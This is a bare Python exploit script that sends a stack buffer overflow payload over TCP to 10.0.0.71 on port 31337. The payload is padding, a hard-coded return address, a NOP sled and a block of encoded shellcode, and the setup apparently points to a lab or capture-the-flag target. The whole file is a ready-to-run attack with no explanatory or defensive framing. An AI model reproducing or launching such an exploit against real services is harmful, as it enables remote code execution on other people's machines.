#!/usr/bin/python
from __future__ import print_function
import sys, socket

overflow = (
"\xb8\xd6\xf8\x13\xb2\xd9\xc0\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x12\x83\xeb\xfc\x03\x95\xf6\xf1\x47\xe5\xef\x74"
"\xa7\x15\xf0\x18\x21\xf0\xc1\x18\x55\x71\x71\xa9\x1d\xd7\x7e"
"\x42\x73\xc3\xf5\x26\x5c\xe4\xbe\x8d\xba\xcb\x3f\xbd\xff\x4a"
"\xbc\xbc\xd3\xac\xfd\x0e\x26\xad\x3a\x72\xcb\xff\x93\xf8\x7e"
"\xef\x90\xb5\x42\x84\xeb\x58\xc3\x79\xbb\x5b\xe2\x2c\xb7\x05"
"\x24\xcf\x14\x3e\x6d\xd7\x79\x7b\x27\x6c\x49\xf7\xb6\xa4\x83"
"\xf8\x15\x89\x2b\x0b\x67\xce\x8c\xf4\x12\x26\xef\x89\x24\xfd"
"\x8d\x55\xa0\xe5\x36\x1d\x12\xc1\xc7\xf2\xc5\x82\xc4\xbf\x82"
"\xcc\xc8\x3e\x46\x67\xf4\xcb\x69\xa7\x7c\x8f\x4d\x63\x24\x4b"
"\xef\x32\x80\x3a\x10\x24\x6b\xe2\xb4\x2f\x86\xf7\xc4\x72\xcf"
"\x34\xe5\x8c\x0f\x53\x7e\xff\x3d\xfc\xd4\x97\x0d\x75\xf3\x60"
"\x71\xac\x43\xfe\x8c\x4f\xb4\xd7\x4a\x1b\xe4\x4f\x7a\x24\x6f"
"\x8f\x83\xf1\x20\xdf\x2b\xaa\x80\x8f\x8b\x1a\x69\xc5\x03\x44"
"\x89\xe6\xc9\xed\x20\x1d\x9a\x1b\xb5\x1d\x09\x74\xb7\x1d\xbc"
"\xd8\x3e\xfb\xd4\xf0\x16\x54\x41\x68\x33\x2e\xf0\x75\xe9\x4b"
"\x32\xfd\x1e\xac\xfd\xf6\x6b\xbe\x6a\xf7\x21\x9c\x3d\x08\x9c"
"\x88\xa2\x9b\x7b\x48\xac\x87\xd3\x1f\xf9\x76\x2a\xf5\x17\x20"
"\x84\xeb\xe5\xb4\xef\xaf\x31\x05\xf1\x2e\xb7\x31\xd5\x20\x01"
"\xb9\x51\x14\xdd\xec\x0f\xc2\x9b\x46\xfe\xbc\x75\x34\xa8\x28"
"\x03\x76\x6b\x2e\x0c\x53\x1d\xce\xbd\x0a\x58\xf1\x72\xdb\x6c"
"\x8a\x6e\x7b\x92\x41\x2b\x9b\x71\x43\x46\x34\x2c\x06\xeb\x59"
"\xcf\xfd\x28\x64\x4c\xf7\xd0\x93\x4c\x72\xd4\xd8\xca\x6f\xa4"
"\x71\xbf\x8f\x1b\x71\xea")

shellcode = "A" * 146 + "\xbf\x16\x04\x08" + "\x90" * 32 + overflow

try:
       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('10.0.0.71',31337))
       s.send((shellcode + '\n'))
       s.close()

except:
       print("Error connecting to server")
       sys.exit()
